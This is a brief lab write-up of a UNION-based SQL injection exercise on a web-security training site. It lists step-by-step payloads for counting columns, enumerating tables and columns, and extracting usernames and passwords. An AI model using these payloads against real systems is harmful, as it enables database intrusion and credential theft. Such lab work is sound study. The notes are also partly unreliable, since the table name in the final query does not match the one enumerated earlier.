This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

(1) Determine number of columns
' ORDER BY 1--
' ORDER BY 2--

'UNION SELECT NULL, NULL--

(2) types of data
we can see from
'UNION SELECT 'a', 'b'--
that it holds text

(3) get table name
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

(4) get column name
https://ac8e1f961f8c2dedc08c010a00b80036.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_qlvwvo%27--

Column: username_pmppme
Password Column:
password_tkgaxy
'+UNION+SELECT+username_pmppme,+password_tkgaxy+FROM+users_tkgaxy--

(5) Get password 
'+UNION+SELECT+username_pmppme,+password_tkgaxy+FROM+users_tkgaxy--